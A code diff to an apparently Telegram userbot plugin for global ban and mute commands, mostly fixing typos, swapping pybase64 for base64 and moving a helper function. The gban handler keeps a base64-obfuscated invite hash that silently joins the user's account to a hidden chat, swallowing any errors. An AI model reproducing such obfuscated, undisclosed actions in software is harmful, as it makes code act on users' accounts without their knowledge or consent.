@@ -5,19 +5,19 @@ dont edit credits
 #  Copyright (C) 2020  sandeep.n(π.$)
 
 import asyncio
+import base64
 from datetime import datetime
 
-import pybase64
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.functions.users import GetFullUserRequest
-from telethon.tl.types import ChatBannedRights, MessageEntityMentionName
+from telethon.tl.types import ChatBannedRights
 
 import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
 
 from ..utils import admin_cmd, edit_or_reply, sudo_cmd
-from . import BOTLOG, BOTLOG_CHATID, CAT_ID, CMD_HELP, admin_groups
+from . import BOTLOG, BOTLOG_CHATID, CAT_ID, CMD_HELP, admin_groups, get_user_from_event
 from .sql_helper.mute_sql import is_muted, mute, unmute
 
 BANNED_RIGHTS = ChatBannedRights(
@@ -47,19 +47,21 @@ UNBAN_RIGHTS = ChatBannedRights(
 @bot.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"gban(?: |$)(.*)", allow_sudo=True))
 async def catgban(cat):
-    cate = await edit_or_reply(cat, "gbaning.......")
+    if cat.fwd_from:
+        return
+    cate = await edit_or_reply(cat, "gbanning.......")
     start = datetime.now()
     user, reason = await get_user_from_event(cat)
     if not user:
         return
     if user.id == (await cat.client.get_me()).id:
-        await cate.edit("why would i ban myself")
+        await cate.edit("why would I ban myself")
         return
     if user.id in CAT_ID:
-        await cate.edit("why would i ban my dev")
+        await cate.edit("why would I ban my dev")
         return
     try:
-        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         await cat.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
@@ -87,7 +89,7 @@ async def catgban(cat):
         except BadRequestError:
             await cat.client.send_message(
                 BOTLOG_CHATID,
-                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor baning here",
+                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor banning here",
             )
     try:
         reply = await cat.get_reply_message()
@@ -119,6 +121,8 @@ async def catgban(cat):
 @bot.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"ungban(?: |$)(.*)", allow_sudo=True))
 async def catgban(cat):
+    if cat.fwd_from:
+        return
     cate = await edit_or_reply(cat, "ungbaning.....")
     start = datetime.now()
     user, reason = await get_user_from_event(cat)
@@ -139,7 +143,7 @@ async def catgban(cat):
         await cate.edit("you are not even admin of atleast one group ")
         return
     await cate.edit(
-        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}`groups"
+        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
     )
     for i in range(sandy):
         try:
@@ -265,7 +269,7 @@ async def endgmute(event):
     else:
         return await edit_or_reply(
             event,
-            "Please reply to a user or add their into the command to ungmute them.",
+            "Please reply to a user or add their username into the command to ungmute them.",
         )
     replied_user = await event.client(GetFullUserRequest(userid))
     if not is_muted(userid, "gmute"):
@@ -289,38 +293,6 @@ async def endgmute(event):
 async def watcher(event):
     if is_muted(event.sender_id, "gmute"):
         await event.delete()
-
-
-async def get_user_from_event(event):
-    """ Get the user from argument or replied message. """
-    args = event.pattern_match.group(1).split(" ", 1)
-    extra = None
-    if event.reply_to_msg_id:
-        previous_message = await event.get_reply_message()
-        user_obj = await event.client.get_entity(previous_message.sender_id)
-        extra = event.pattern_match.group(1)
-    elif args:
-        user = args[0]
-        if len(args) == 2:
-            extra = args[1]
-        if user.isnumeric():
-            user = int(user)
-        if not user:
-            await event.edit("`Pass the user's username, id or reply!`")
-            return
-        if event.message.entities:
-            probable_user_mention_entity = event.message.entities[0]
-
-            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
-                user_id = probable_user_mention_entity.user_id
-                user_obj = await event.client.get_entity(user_id)
-                return user_obj
-        try:
-            user_obj = await event.client.get_entity(user)
-        except (TypeError, ValueError):
-            await event.edit("Could not fetch info of that user.")
-            return None
-    return user_obj, extra
 
 
 CMD_HELP.update(
